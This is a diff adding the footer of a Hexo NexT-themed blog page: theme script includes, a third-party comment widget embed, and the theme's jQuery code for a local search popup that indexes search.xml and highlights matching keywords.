+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+
+    
+      <!-- UY BEGIN -->
+	<div id="uyan_frame"></div>
+	<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2160339"></script>
+	<!-- UY END -->
+    
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
